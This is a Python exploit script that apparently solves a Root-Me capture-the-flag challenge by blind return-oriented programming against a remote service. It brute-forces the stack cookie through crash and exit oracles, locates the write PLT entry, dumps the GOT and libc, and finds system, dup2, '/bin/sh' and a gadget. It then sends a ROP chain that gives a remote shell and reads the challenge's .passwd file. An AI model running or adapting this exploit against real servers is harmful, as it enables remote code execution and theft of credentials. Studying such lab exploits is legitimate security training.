from oracle_iteration import *
from request import *
from globs import *
from util import *
import binascii
import struct


#https://github.com/niklasb/libc-database
#libc6_2.13-38+deb7u10_i386.so

meta = {}
correspondances = {}
prefix = -1
cookie = ''
PORT = 7778
host = 'localhost'
PORT = 56543
host = 'challenge03.root-me.org'
cookie_file = 'cookie.'+host+'.'+str(PORT)
temp_addresses_file = 'temporary_addresses.'+host+'.'+str(PORT)
backbone_file = 'backbone.'+host+'.'+str(PORT)
range_file = 'range.'+host+'.'+str(PORT)
write_address_file = 'write.'+host+'.'+str(PORT)

Glob.host = host
Glob.PORT = PORT
Glob.nb_answers_stats = 3


def log(C, x, input):
    print(x)
    print("Obtained for input = "+binascii.hexlify(input[32:]))

def test_cookie(C):
    if Glob.prefix == -1:
        return True
    tmp = Request(host, PORT).send_receive(Glob.prefix+Glob.cookie[:4])
    if index_correspondance(tmp>>2) == 0:
        print("[!] Cookie changed or something went wrong, recomputing cookie")
        Glob.recompute = True
        Glob.cookie = ''
        Glob.cookie = leak_cookie(Glob.prefix, 20, Glob.nb_answers_stats)
        tmp = Request(host, PORT).send_receive(Glob.prefix+Glob.cookie[:4])
        if index_correspondance(tmp>>2) == 0:
            print("[!!] Something definitively went wrong (cookie is still bad), exiting")
            exit()
        print("[.] Cookie found "+binascii.hexlify(Glob.cookie))
        with open(cookie_file,'wb') as f:
            f.write(Glob.cookie)
    return True

Request.new_request_callback = log
Request.test_cookie_callback = test_cookie


def load_prefix(recompute = False):
    try:
        Glob.prefix = open('prefix','rb').read()
        print("[+] Testing with prefix "+Glob.prefix)
    except:
        recompute = True
    finally:
        if recompute:
            print("[+] Finding vulnerable length")
            Glob.prefix = -1
            l = find_length()
            Glob.prefix = '@'*l
            print("[.] Length found : "+str(l))

            with open('prefix','wb') as f:
                f.write(Glob.prefix)


def load_cookie(recompute = False):
    try:
        Glob.cookie = open(cookie_file,'rb').read()
        print("[+] Testing with cookie "+binascii.hexlify(Glob.cookie))
    except:
        recompute = True
    finally:
        if recompute:
            print("[+] Finding cookie")
            Glob.cookie = leak_cookie(Glob.prefix, 20, Glob.nb_answers_stats)
            print("[.] Cookie found "+binascii.hexlify(Glob.cookie))
            with open(cookie_file,'wb') as f:
                f.write(Glob.cookie)


def craft_payload_from_addr(code_addr_int, start_in_cookie):
    return Glob.cookie[:start_in_cookie]+struct.pack('I', code_addr_int)+Glob.cookie[start_in_cookie+4:]

def react_to(code_addr_int, to_send):
    req = Request(host, PORT)
    tmp = req.send_receive(Glob.prefix+to_send)
    index = tmp>>2
    exited = (tmp>>1)&1
    crash = tmp&1
    if exited == 0 or crash:
        addr = struct.pack('I', code_addr_int)
        print("[.] New possible address found (timed out) at "+binascii.hexlify(addr[::-1])+" with correspondance index : "+str(index_correspondance(index)))
        return (True, True)
    if index_correspondance(index) > 0:
        addr = struct.pack('I', code_addr_int)
        print("[.] New possible address found at "+binascii.hexlify(addr[::-1])+" with correspondance index : "+str(index_correspondance(index)))
        return (True, False)
    return (False, False)

def find_interesting_addresses(recompute = True):
    if not recompute and not Glob.recompute:
        try:
            content = open(temp_addresses_file, 'rb').read()
            content = content.split('===================')
            part1_str = content[0].split('\n')
            part2_str = content[1].split('\n')
            part1 = []
            part2 = []
            for i in part1_str:
                if len(i)>0:
                    part1.append(int(i))
            for i in part2_str:
                if len(i)>0:
                    part2.append(int(i))
        except:
            recompute = True

    if recompute or Glob.recompute:
        print("[+] Finding Temporary addresses")
        offset_addr_in_cookie = 16
        aligned = 4
        delay_double_period = 8
        stop_period = 16
        random_reset_smaller_period = 16

        code_addr = Glob.cookie[offset_addr_in_cookie:offset_addr_in_cookie+4]
        code_addr_int = struct.unpack('I',code_addr)[0]
        print(code_addr)

        oracle_keep_address = lambda int_addr: react_to(int_addr, craft_payload_from_addr(int_addr, offset_addr_in_cookie))

        tmp = Oracle_Iteration(code_addr_int, aligned, delay_double_period, stop_period, random_reset_smaller_period)
        tmp.reset_oracle(oracle_keep_address)

        part1, part2 = tmp.itere()

        f = open(temp_addresses_file, 'wb')
        for i in part1:
            f.write(str(i)+'\n')
        f.write('===================')
        for i in part2:
            f.write(str(i)+'\n')
        f.close()

    Glob.interesting_addresses = (part1, part2)
    print("[.] Obtained interesting addresses : "+str(part1)+" and very interesting "+str(part2))
    return (part1, part2)

def analyse_offsets(out = 'offsets/offset_1'):
    addr1,addr2 = Glob.interesting_addresses

    try:
        with open(out+'_part1', 'wb') as f:
            for i in range(1, len(addr1)):
                f.write(str(addr1[i]-addr1[i-1])+'\n')
        with open(out+'_part2', 'wb') as f:
            for i in range(1, len(addr2)):
                f.write(str(addr2[i]-addr2[i-1])+'\n')
    except:
        print("[!] Unable to create offset files, exiting")
        exit()

def find_sticking_address(ret_addr_in_cookie, N, recompute=False):
    if not recompute and not Glob.recompute:
        try:
            content = open(backbone_file, 'rb').read()
            Glob.backbone = int(content)
            content = open(range_file, 'rb').read().split('\n')
            Glob.range = (int(content[0]),int(content[1]))
        except:
            recompute = True

    if recompute or Glob.recompute:
        base = struct.unpack('I', Glob.cookie[ret_addr_in_cookie:ret_addr_in_cookie+4])[0]//4
        found = []
        for i in range(N):
            addr = (base-i)*4

            begin = Glob.cookie[:16]
            input = Glob.prefix+begin+struct.pack('I',addr)+struct.pack('I',Glob.base)
            input = Glob.prefix+begin+struct.pack('I',addr)+'\xaa\xbb\xcc\xdd'

            req = Request(host, PORT)
            tmp = req.send_receive(input)
            exited = (tmp>>1)&1

            if exited==0:
                print(hex(addr))
                found.append(addr)

        m = -1
        final_addrs = []
        plt = []
        for j in found:
            n = 0
            addrs = []
            plt_bis = []
            for i in range(N):
                addr = (base-i)*4

                begin = Glob.cookie[:16]
                input = Glob.prefix+begin+struct.pack('I',addr)+struct.pack('I',j)

                req = Request(host, PORT)
                tmp = req.send_receive(input)
                exited = (tmp>>1)&1

                if exited==0:
                    n += 1
                    print(hex(addr), n)
                    plt_bis.append(addr)
                    addrs.append(hex(addr))

            if n>m:
                print("[.] New max found ! For "+hex(j))
                final_addrs = addrs
                plt = plt_bis
                backbone = j
                m = n
                if n>20:
                    print("[.] More than 20 addresses are suitable, using corresponding backbone")
                    break

        open(backbone_file, 'wb').write(str(backbone))
        Glob.backbone = backbone

        m = 0
        M = 0
        for i in range(1,len(plt)):
            if plt[i-1]-plt[i]<=80:
                M = plt[i]
            else:
                m = plt[i]

        f = open(range_file, 'wb')
        f.write(str(M)+'\n')
        f.write(str(m))
        return (M,m)
    else:
        return Glob.range

def find_write(plt_range, recompute=False):
    if not recompute and not Glob.recompute:
        try:
            content = open(write_address_file, 'rb').read()
            Glob.write_address = int(content)
        except:
            recompute = True

    if recompute or Glob.recompute:
        for i in range(plt_range[0], plt_range[1], 4):
            input = Glob.prefix+Glob.cookie[:16]+struct.pack('I',i)+struct.pack('I',Glob.base)+"\x04\x00\x00\x00"+Glob.cookie[8:12]+"\xff\x00\x00\x00\x00\x00\x00\x00"

            req = Request(host, PORT)
            tmp = req.send_receive(input)
            index = tmp>>2
            exited = (tmp>>1)&1
            crash = tmp&1

            out = req.get_answer(tmp>>2)
            if len(out)>2 and len(out[2])>100:
                print(len(Glob.cookie))
                print(hex(i))
                print(req.get_answer(tmp>>2))
                out = req.get_answer(tmp>>2)
                if len(out)>2 and len(out[2])>100:
                    print("[+] FOUND GOT with "+hex(i))
                    break
                print("Index "+str(index)+", exited "+str(exited)+", crash "+str(crash))
        open(write_address_file, 'wb').write(str(i))
        Glob.write_address = i
    return Glob.write_address

def dump(addr, n_bytes):
    input = Glob.prefix+Glob.cookie[:16]+struct.pack('I',Glob.write_address)+"\xaa\xbb\xcc\xdd\x04\x00\x00\x00"+struct.pack('I',addr)+struct.pack('I',n_bytes)+"\x00\x00\x00\x00"

    req = Request(host, PORT)
    #tmp = req.send_receive(input)
    tmp = req.dump(input, n_bytes, 'you lose!')
    index = tmp>>2

    tmp = req.get_answer(index)
    return tmp[0]


load_prefix()
load_cookie()
print("[+] Confirming cookie works :")
tmp = Request(host, PORT).send_receive(Glob.prefix+Glob.cookie)
print("[.] Request "+binascii.hexlify(Glob.prefix+Glob.cookie)+" gives "+str(tmp>>2)+" (index), "+str((tmp&2)>>1)+" (exited), "+str(tmp&1)+" (crashed)")
if index_correspondance(tmp>>2) == 0:
    print("[-] Bad news : cookie is wrong ... Recomputing")
    Glob.recompute = True
    load_cookie()
find_interesting_addresses(False)
Glob.base = Glob.interesting_addresses[1][0]
print("[+] Using "+hex(Glob.base)+" as reference but finding real backbone after")
#analyse_offsets('offsets/offset_3')
plt = find_sticking_address(16, 512)
print("With found backbone, lot of addresses found : "+str(plt))
print("[+] Using "+hex(Glob.backbone)+" as backbone")
write_addr = find_write(plt)

Glob.got = struct.unpack('I',Glob.cookie[8:12])[0]

got_dumped = dump(Glob.got,200)
addrs = []
ref = 0
ref_ok = False
for i in range(0,len(got_dumped),4):
    addr = struct.unpack('I',got_dumped[i:i+4])[0]
    if ref_ok and addr>=ref-0x100000 and addr<=ref+0x100000:
        addrs.append(addr)
    elif not ref_ok:
        print("Take "+hex(addr)+" as ref ?")
        rep = raw_input()
        if rep == 'y':
            ref_ok = True
            ref = addr
            addrs.append(addr)

m = addrs[0]
M = addrs[0]
for i in addrs:
    print(hex(i))
    print(hex(i)+" => "+binascii.hexlify(dump(i,20)))

    if i>M:
        M = i
    if i<m:
        m = i

print("[+] Dumping libc from "+hex(m)+" to "+hex(M))
dumped = open('libc_dumped2_0xec5cdd60L', 'rb').read()
# dumped = dump(m,M-m+500)
# with open('libc_dumped2_'+hex(m), 'wb') as f:
#    f.write(dumped)

to_find = {'bin_sh':'/bin/sh','system':'\x83\xec\x0c\x89\x74\x24\x04\x8b','dup2':'\x89\xDA\x8B\x4C\x24\x08\x8B\x5C\x24\x04\xB8\x3F\x00\x00','pop_pop_ret':'\x5f\x5d\xc3'}
corresp = {}
for pattern in to_find:
    print(pattern+" found at "+hex(dumped.index(to_find[pattern])))
    corresp[pattern] = m+dumped.index(to_find[pattern])



input = Glob.prefix+Glob.cookie[:16]
input += struct.pack('I',corresp['dup2'])+struct.pack('I',corresp['pop_pop_ret'])+'\x04\x00\x00\x00'+'\x00\x00\x00\x00'
input += struct.pack('I',corresp['dup2'])+struct.pack('I',corresp['pop_pop_ret'])+'\x04\x00\x00\x00'+'\x01\x00\x00\x00'
input += struct.pack('I',corresp['dup2'])+struct.pack('I',corresp['pop_pop_ret'])+'\x04\x00\x00\x00'+'\x02\x00\x00\x00'
#input += struct.pack('I',Glob.write_address)+"\xaa\xbb\xcc\xdd\x01\x00\x00\x00"+struct.pack('I',corresp['system'])+struct.pack('I',50)+"\x00\x00\x00\x00"
input += struct.pack('I',corresp['system'])+'\xaa\xbb\xcc\xdd'+struct.pack('I',corresp['bin_sh'])

req = Request(host, PORT)

for a in req.send_receive_list([input, 'whoami', 'ls -Al', 'cat /challenge/app-systeme/ch43/.passwd', 'ls -Al /challenge']):
    print(a)

#!!TotallyBlind!!GoodJob!!
